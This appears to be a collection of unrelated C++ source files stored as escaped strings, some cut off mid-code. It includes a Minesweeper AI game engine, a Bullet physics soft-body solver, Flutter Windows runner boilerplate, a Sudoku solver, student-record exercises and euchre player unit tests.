agent = new RandomAI( rowDimension, colDimension, totalMines, agentX, agentY );\n\n    else if (aiType == \"manualAI\")\n        agent = new ManualAI( rowDimension, colDimension, totalMines, agentX, agentY );\n\n    else\n        agent = new MyAI( rowDimension, colDimension, totalMines, agentX, agentY );\n\n}\n\nWorld::~World() {\n    for ( int index = 0; index < colDimension; ++index )\n        delete [] board[index];\n\n    delete [] board;\n}\n\n// ===============================================================\n// =\t\t\t\t\tEngine Function\n// ===============================================================\n\nint World::run()\n{\n    int perceptNumber;\n    bool gameOver = false;\n    int move = 0;\n\n    while ( !gameOver && move < maxMoves )\n    {\n        if ( debug || dynamic_cast<ManualAI*>(agent))\n        {\n            printWorldInfo();\n\n            if ( !dynamic_cast<ManualAI*>(agent) )\n            {\n                // Pause the game, only if manualAI isn't on\n                // because manualAI pauses for us\n                cout << \"Press ENTER to continue...\" << endl;\n                cin.ignore( 999, '\\n');\n            }\n        }\n\n        if (lastAction.action == Agent::UNCOVER)\n            perceptNumber = board[agentX][agentY].number;\n        else\n            perceptNumber = -1;\n        lastAction = agent->getAction( perceptNumber );\n\n        // Make the move\n        gameOver = doMove();\n\n        move++;\n    }\n\n    return score;\n}\n\n\n// ===============================================================\n// =\t\t\t\tWorld Generation Functions\n// ===============================================================\nvoid World::addFeatures(    )\n// Adding mines, adding mine counter according to neighbour, uncover first file\n{\n    addMine();\n    // Generate number of mines around\n    addMineCount();\n}\n\nvoid World::addFeatures( std::ifstream &file )\n// set feature according to the file\n{\n\n    int r = rowDimension;\n    bool mine = 0;\n\n    // generate mine according to input file\n    while (r > 0 &&!file.eof() )\n    {\n        --r;\n\n        for ( int c = 0; c < colDimension; ++c )\n        {\n            file >> mine;\n\n            if (file.fail())\n                throw exception();\n            if (mine)\n            {\n                board[c][r].mine = mine;\n                ++totalMines;\n            }\n        }\n    }\n\n    addMineCount();\n}\n\nAgent::Action World::genFirstAxis(  )\n// Generate random first move axis: in bound, has no mine, no neighbour has mine\n// return agent for first move coordinates info\n{\n    int fc = randomInt( colDimension );\n    int fr = randomInt( rowDimension );\n    while ( !isInBounds( fc, fr ))\n    {\n        fc = randomInt( colDimension );\n        fr = randomInt( rowDimension );\n    }\n    board[fc][fr].uncovered = true;\n\n    return",
    "/*\nBullet Continuous Collision Detection and Physics Library\nCopyright (c) 2003-2006 Erwin Coumans  http://continuousphysics.com/Bullet/\n\nThis software is provided 'as-is', without any express or implied warranty.\nIn no event will the authors be held liable for any damages arising from the use of this software.\nPermission is granted to anyone to use this software for any purpose, \nincluding commercial applications, and to alter it and redistribute it freely, \nsubject to the following restrictions:\n\n1. The origin of this software must not be misrepresented; you must not claim that you wrote the original software. If you use this software in a product, an acknowledgment in the product documentation would be appreciated but is not required.\n2. Altered source versions must be plainly marked as such, and must not be misrepresented as being the original software.\n3. This notice may not be removed or altered from any source distribution.\n*/\n\n#include \"BulletCollision/CollisionShapes/btTriangleIndexVertexArray.h\"\n#include \"BulletCollision/CollisionDispatch/btCollisionObject.h\"\n#include \"BulletCollision/CollisionShapes/btCollisionShape.h\"\n\n#include \"btDefaultSoftBodySolver.h\"\n#include \"BulletCollision/CollisionShapes/btCapsuleShape.h\"\n#include \"BulletSoftBody/btSoftBody.h\"\n\nbtDefaultSoftBodySolver::btDefaultSoftBodySolver()\n{\n\t// Initial we will clearly need to update solver constants\n\t// For now this is global for the cloths linked with this solver - we should probably make this body specific\n\t// for performance in future once we understand more clearly when constants need to be updated\n\tm_updateSolverConstants = true;\n}\n\nbtDefaultSoftBodySolver::~btDefaultSoftBodySolver()\n{\n}\n\n// In this case the data is already in the soft bodies so there is no need for us to do anything\nvoid btDefaultSoftBodySolver::copyBackToSoftBodies(bool bMove)\n{\n}\n\nvoid btDefaultSoftBodySolver::optimize(btAlignedObjectArray<btSoftBody *> &softBodies, bool forceUpdate)\n{\n\tm_softBodySet.copyFromArray(softBodies);\n}\n\nvoid btDefaultSoftBodySolver::updateSoftBodies()\n{\n\tfor (int i = 0; i < m_softBodySet.size(); i++)\n\t{\n\t\tbtSoftBody *psb = (btSoftBody *)m_softBodySet[i];\n\t\tif (psb->isActive())\n\t\t{\n\t\t\tpsb->integrateMotion();\n\t\t}\n\t}\n}  // updateSoftBodies\n\nbool btDefaultSoftBodySolver::checkInitialized()\n{\n\treturn true;\n}\n\nvoid btDefaultSoftBodySolver::solveConstraints(float solverdt)\n{\n\t// Solve constraints for non-solver softbodies\n\tfor (int i = 0; i < m_softBodySet.size(); ++i)\n\t{\n\t\tbtSoftBody *psb = static_cast<btSoftBody *>(m_softBodySet[i]);\n\t\tif (psb->isActive())\n\t\t{\n\t\t\tpsb->solveConstraints();\n\t\t}\n\t}\n}  // btDefaultSoftBodySolver::solveConstraints\n\nvoid btDefaultSoftBodySolver::copySoftBodyToVertexBuffer(const btSoftBody *const softBody, btVertexBufferDescriptor *vertexBuffer)\n{\n\t// Currently only support CPU output buffers\n\t// TODO: check for DX11 buffers. Take all offsets into the same DX11 buffer\n\t// and use them together on a single kernel call if possible by setting up a\n\t// per-cloth target buffer array for the copy kernel.\n\n\tif (vertexBuffer->getBufferType() == btVertexBufferDescriptor::CPU_BUFFER)\n\t{\n\t\tconst btAlignedObjectArray<btSoftBody::Node> &clothVertices(softBody->m_nodes);\n\t\tint numVertices = clothVertices.size();\n\n\t\tconst btCPUVertexBufferDescriptor *cpuVertexBuffer = static_cast<btCPUVertexBufferDescriptor *>(vertexBuffer);\n\t\tfloat *basePointer = cpuVertexBuffer->getBasePointer();\n\n\t\tif (vertexBuffer->hasVertexPositions())\n\t\t{\n\t\t\tconst int vertexOffset = cpuVertexBuffer->getVertexOffset();\n\t\t\tconst int vertexStride = cpuVertexBuffer->getVertexStride();\n\t\t\tfloat *vertexPointer = basePointer + vertexOffset;\n\n\t\t\tfor (int vertexIndex = 0; vertexIndex < numVertices; ++vertexIndex)\n\t\t\t{\n\t\t\t\tbtVector3 position = clothVertices[vertexIndex].m_x;\n\t\t\t\t*(vertexPointer + 0) = (float)position.getX();\n\t\t\t\t*(vertexPointer + 1) = (float)position.getY();\n\t\t\t\t*(vertexPointer + 2) = (float)position.getZ();\n\t\t\t\tvertexPointer += vertexStride;\n\t\t\t}\n\t\t}\n\t\tif (vertexBuffer->hasNormals())\n\t\t{\n\t\t\tconst int normalOffset = cpuVertexBuffer->getNormalOffset();\n\t\t\tconst int normalStride = cpuVertexBuffer->getNormalStride();\n\t\t\tfloat *normalPointer = basePointer + normalOffset;\n\n\t\t\tfor (int vertexIndex = 0; vertexIndex < numVertices; ++vertexIndex)\n\t\t\t{\n\t\t\t\tbtVector3 normal = clothVertices[vertexIndex].m_n;\n\t\t\t\t*(normalPointer + 0) = (float)normal.getX();\n\t\t\t\t*(normalPointer + 1) = (float)normal.getY();\n\t\t\t\t*(normalPointer + 2) = (float)normal.getZ();\n\t\t\t\tnormalPointer += normalStride;\n\t\t\t}\n\t\t}\n\t}\n}  // btDefaultSoftBodySolver::copySoftBodyToVertexBuffer\n\nvoid btDefaultSoftBodySolver::processCollision(btSoftBody *softBody, btSoftBody *otherSoftBody)\n{\n\tsoftBody->defaultCollisionHandler(otherSoftBody);\n}\n\n// For the default solver just leave the soft body to do its collision processing\nvoid btDefaultSoftBodySolver::processCollision(btSoftBody *softBody, const btCollisionObjectWrapper *collisionObjectWrap)\n{\n\tsoftBody->defaultCollisionHandler(collisionObjec",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <math.h>\n#include \"sudoku.h\"\n\nSudoku::Sudoku() {\n  this->numRows = 9;\n  this->numCols = 9;\n  this->boxSideLen = 3;\n  this->isSolved = false;\n  this->board = new int*[numRows];\n\n  for (int i = 0; i < this->numRows; i++) {\n    this->board[i] = new int[numCols];\n  }\n\n  for (int i = 0; i < this->numRows; i++) {\n    for (int j = 0; j < this->numCols; j++) {\n      this->board[i][j] = 0;\n    }\n  }\n}\n\nSudoku::Sudoku(int board[9][9]) {\n  this->numRows = 9;\n  this->numCols = 9;\n  this->boxSideLen = 3;\n  this->isSolved = false;\n  this->board = new int*[numRows];\n\n  for (int i = 0; i < this->numRows; i++) {\n    this->board[i] = new int[numCols];\n  }\n\n  for (int i = 0; i < numRows; i++) {\n    for (int j = 0; j < numCols; j++) {\n      this->board[i][j] = board[i][j];\n    }\n  }\n}\n\nSudoku::~Sudoku() {\n  for (int i = 0; i < numRows; i++) {\n    delete [] board[i];\n  }\n  delete [] board;\n}\n\nvoid Sudoku::printBoard() {\n  if (!isSolved) {\n    std::cout << \"Original Sudoku: \" << std::endl;\n  }\n  else {\n    std::cout << \"Solved Sudoku: \" << std::endl; \n  }\n  for (int i = 0; i < numRows; i++) {\n    std::cout << \"| \";\n    for (int j = 0; j < numCols; j++) {\n      std::cout << board[i][j];\n      if (j < numCols - 1) {\n        std::cout << \" | \";\n      }\n    }\n    std::cout << \" |\" << std::endl;\n  }\n  std::cout << std::endl;\n}\n\nbool Sudoku::isSafe(int row, int col) {\n  int value = board[row][col];\n  for (int i = 0; i < numCols; i++) {\n    if (i != col && value == board[row][i]) return false;\n  }\n\n  for (int i = 0; i < numRows; i++) {\n    if (i != row && value == board[i][col]) return false;\n  }\n\n  int boxStartRow = row/3 * 3;\n  int boxStartCol = col/3 * 3;\n  for (int i = 0; i < numRows; i++) {\n    int currentRow = boxStartRow + (i / 3);\n    int currentCol = boxStartCol + (i % 3);\n\n    if (currentCol != col && currentRow != row && board[currentRow][currentCol] == value) return false;\n  }\n\n  return true;\n}\n\nbool Sudoku::solveRecurse(int row, int col) {\n  if (row == numRows - 1 && col == numCols) {\n    return true;\n  }\n\n  if (col == numCols) {\n    col = 0;\n    row ++;\n  }\n\n  if (board[row][col] != 0) return solveRecurse(row, col + 1);\n\n  for (int i = 1; i <= numRows; i++) {\n    this->board[row][col] = i;\n    if (isSafe(row, col)) {\n      if (solveRecurse(row, col+1)) return true;\n    }\n    this->board[row][col] = 0;\n  }\n\n  return false;\n}\n\nbool Sudoku::solve() {\n  isSolved = this->solveRecurse(0, 0);\n  return isSolved;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\nusing namespace std;\n\nstruct Mahasiswa {\n\tstring nim;\n\tstring nama;\n\tstring alamat;\n\tstring umur;\n};\n\nint main() {\n\tMahasiswa mhs;\n\tcout << \"Nomor Mahasiswa : \";\n\tcin >> mhs.nim;\n\tcout << \"Nama Mahasiswa : \";\n\tcin >> mhs.nama;\n\tcout << \"Alamat Mahasiswa : \";\n\tcin >> mhs.alamat;\n\tcout << \"Umur Mahasiswa : \";\n\tcin >> mhs.umur;\n\n\tcout << endl; \n\tcout << \"\\n NIM : \"<<mhs.nim;\n\tcout << \"\\n Nama : \" << mhs.nama;\n\tcout << \"\\n Alamat : \" << mhs.alamat;\n\tcout << \"\\n Umur : \" << mhs.umur;\n\n}\n\n#include <iostream>\nusing namespace std;\n\nstruct DetailAlamat{\n\tstring desa;\n\tstring kota;\n};\n\nstruct Mahasiswa {\n\tstring nim;\n\tstring nama;\n\tDetailAlamat alamat;\n\tint umur;\n};\n\nint main() {\n\tMahasiswa mhs;\n\tcout << \"Nomor Mahasiswa : \";\n\tcin >> mhs.nim;\n\tcout << \"Nama Mahasiswa : \";\n\tcin >> mhs.nama;\n\n\tcout << \"Alamat Mahasiswa : \" << endl;\n\tcout << \"\\t Nama Desa : \";\n\tcin >> mhs.alamat.desa;\n\tcout << \"\\t Nama Kota : \";\n\tcin >> mhs.alamat.kota;\n\n\tcout << \"Umur Mahasiswa : \";\n\tcin >> mhs.umur;\n\n\tcout << endl;\n\tcout <<\"\\n Nim : \" << mhs.nim;\n\tcout << \"\\n Nama : \" << mhs.nama;\n\tcout << \"\\n Alamat : \";\n\tcout << \"\\n \\t Desa : \" << mhs.alamat.desa;\n\tcout << \"\\n \\t Kota : \" << mhs.alamat.kota;\n\tcout << \"\\n Umur : \" << mhs.umur; \n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weather_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Project UID 1d9f47bfc76643019cfbf037641defe1\n\n#include \"Player.h\"\n#include \"unit_test_framework.h\"\n\n#include <iostream>\n\nusing namespace std;\n\nTEST(test_player_get_name) {\n    Player * alice = Player_factory(\"Alice\", \"Simple\");\n    ASSERT_EQUAL(\"Alice\", alice->get_name());\n\n    delete alice;\n}\n\nTEST(test_player_insertion) { //from public tests\n  // Create a Human player\n  Player * human = Player_factory(\"NotRobot\", \"Human\");\n\n  // Print the player using the stream insertion operator\n  ostringstream oss1;\n  oss1 << * human;\n\n  // Verify that the output is the player's name\n  ASSERT_EQUAL(oss1.str(), \"NotRobot\");\n\n  // Create a Simple player\n  Player * alice = Player_factory(\"Alice\", \"Simple\");\n\n  // Print the player using the stream insertion operator\n  ostringstream oss2;\n  oss2 << *alice;\n  ASSERT_EQUAL(oss2.str(), \"Alice\");\n\n  // Clean up players that were created using Player_factory()\n  delete human;\n  delete alice;\n}\n\nTEST(test_simple_player_make_trump1) { //1 round, dealer, orders up\n  // Bob's hand\n  Player * bob = Player_factory(\"Bob\", \"Simple\");\n  bob->add_card(Card(KING, SPADES));\n  bob->add_card(Card(TEN, HEARTS));\n  bob->add_card(Card(QUEEN, SPADES));\n  bob->add_card(Card(JACK, SPADES));\n  bob->add_card(Card(ACE, CLUBS));\n\n  // Bob makes trump\n  Card nine_spades(NINE, SPADES);\n  Suit trump;\n  bool orderup = bob->make_trump(\n    nine_spades,    // Upcard\n    true,           // Bob is also the dealer\n    1,              // First round\n    trump           // Suit ordered up (if any)\n  );\n\n  // Verify Bob's order up and trump suit\n  ASSERT_TRUE(orderup);\n  ASSERT_EQUAL(trump, SPADES);\n\n  delete bob;\n}\n\nTEST(test_simple_player_make_trump2) { // 1 round, dealer, does not order up\n  // Bob's hand\n  Player * bob = Player_factory(\"Bob\", \"Simple\");\n  bob->add_card(Card(NINE, SPADES));\n  bob->add_card(Card(TEN, HEARTS));\n  bob->add_card(Card(QUEEN, SPADES));\n  bob->add_card(Card(JACK, SPADES));\n  bob->add_card(Card(ACE, CLUBS));\n\n  // Bob makes trump\n  Card nine_diamonds(NINE, DIAMONDS);\n  Suit trump;\n  bool orderup = bob->make_trump(\n    nine_diamonds,    // Upcard\n    true,           // Bob is also the dealer\n    1,              // First round\n    trump           // Suit ordered up (if any)\n  );\n\n  // Verify Bob's order up and trump suit\n  ASSERT_FALSE(orderup);\n\n  delete bob;\n}\n\nTEST(test_simple_player_make_trump3) { // 1 round, not dealer, does not order up\n  // Bob's hand\n  Player * bob = Player_factory(\"Bob\", \"Simple\");\n  bob->add_card(Card(NINE, SPADES));\n  bob->add_card(Card(TEN, HEARTS));\n  bob->add_card(Card(QUEEN, SPADES));\n  bob->add_card(Card(JACK, SPADES));\n  bob->add_card(Card(ACE, CLUBS));\n\n  // Bob makes trump\n  Card nine_diamonds(NINE, DIAMONDS);\n  Suit trump;\n  bool orderup = bob->make_trump(\n    nine_diamonds,    // Upcard\n    false,           // Bob is not the dealer\n    1,              // First round\n    trump           // Suit ordered up (if any)\n  );\n\n  // Verify Bob's order up and trump suit\n  ASSERT_FALSE(orderup);\n\n  delete bob;\n}\n\nTEST(test_simple_player_make_trump4) { // 2 round, not dealer, orders up next_suit\n  // Bob's hand\n  Player * bob = Player_factory(\"Bob\", \"Simple\");\n  bob->add_card(Card(NINE, SPADES));\n  bob->add_card(Card(QUEEN, HEARTS));\n  bob->add_card(Card(QUEEN, SPADES));\n  bob->add_card(Card(KING, HEARTS));\n  bob->add_card(Card(ACE, CLUBS));\n\n  // Bob makes trump\n  Card nine_diamonds(NINE, DIAMONDS);\n  Suit trump;\n  bool orderup = bob->make_trump(\n    nine_diamonds,    // Upcard\n    false,           // Bob is not the dealer\n    2,              // Second round\n    trump           // Suit ordered up (if any)\n  );\n\n  // Verify Bob's order up and trump suit\n  ASSERT_TRUE(orderup);\n  ASSERT_EQUAL(trump, HEARTS);\n\n  delete bob;\n}\n\nTEST(test_simple_player_make_trump5) { // 2 round, dealer, screw the dealer\n  // Bob's hand\n  Player * bob = Player_factory(\"Bob\", \"Simple\");\n  bob->add_card(Card(FIVE, SPADES));\n  bob->add_card(Card(TEN, HEARTS));\n  bob->add_card(Card(QUEEN, SPADES));\n  bob->add_card(Card(NINE, HEARTS));\n  bob->add_card(Card(ACE, CLUBS));\n\n  // Bob makes trump\n  Card nine_diamonds(NINE, DIAMONDS);\n  Suit trump;\n  bool orderup = bob->make_trump(\n    nine_diamonds,    // Upcard\n    true,           // Bob is the dealer\n    2,              // Second round\n    trump           // Suit ordered up (if any)\n  );\n\n  // Verify Bob's order up and trump suit\n  ASSERT_TRUE(orderup);\n  ASSERT_EQUAL(trump, HEARTS);\n\n  delete bob;\n}\n\nTEST(test_simple_player_make_trump6) { // 1 round, not dealer, less cards\n  // Bob's hand\n  Player * bob = Player_factory(\"Bob\", \"Simple\");\n  bob->add_card(Card(ACE, DIAMONDS));\n  bob->add_card(Card(JACK, HEARTS));\n\n  // Bob makes trump\n  Card nine_diamonds(NINE, DIAMONDS);\n  Suit trump;\n  bool orderup = bob->make_trump(\n    nine_diamonds,    // Upcard\n    false,           // Bob is not the dealer\n    1,              // First round\n    trump           // Suit ordered up (if any)\n  );\n\n  // Verify Bob's order up and trump suit\n  ASSERT_TRUE(o",
